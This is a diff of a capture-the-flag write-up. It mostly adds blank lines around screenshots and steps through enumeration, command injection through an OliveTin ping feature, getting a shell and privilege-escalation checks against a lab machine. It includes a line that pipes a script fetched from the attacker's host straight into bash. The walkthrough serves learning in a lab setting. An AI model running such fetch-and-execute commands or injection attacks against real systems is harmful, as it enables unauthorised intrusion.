@@ -22,6 +22,7 @@ gobuster dir -u http://10.81.166.213 -w /usr/share/wordlists/dirb/big.txt
 ![temp](assets/20260717082637.png)
 
 **PHP application** 
+
 ![temp](assets/20260717082844.png)
 
 
@@ -35,6 +36,7 @@ I download the image and:
 ```bash
 exiftool blabal.jpg
 ```
+
 ![temp](assets/20260717094437.png)
 
 I go to this URL and:
@@ -64,6 +66,7 @@ This is the ansible repo:
 
 
 I found the Ansible tasks which were hinted to in the note (port 1337):
+
 ![temp](assets/20260717095102.png)
 
 From the previous note we know that Ansible is on port 1337.
@@ -73,12 +76,15 @@ Port1337: (olivetin)
 ![temp](assets/20260722131506.png)
 
 I can ping host
+
 ![temp](assets/20260717095347.png)
+
 I enter my IP and look at tcpdump:
 
 ```bash
 sudo tcpdump -i eth0
 ```
+
 ![temp](assets/20260717095343.png)
 
 I can see them. RCE?
@@ -86,7 +92,9 @@ I can see them. RCE?
 ![temp](assets/20260717095738.png)
 
 Enter the shell ^
+
 ![temp](assets/20260722131637.png)
+
 Now we run the playbook
 
 ![temp](assets/20260717095800.png)
@@ -109,6 +117,7 @@ Lets run linPEAS
 ```bash
 curl 192.168.135.169:6767/linpeas.sh|bash
 ```
+
 ![temp](assets/20260722133204.png)
 
 https://www.exploit-db.com/exploits/51217
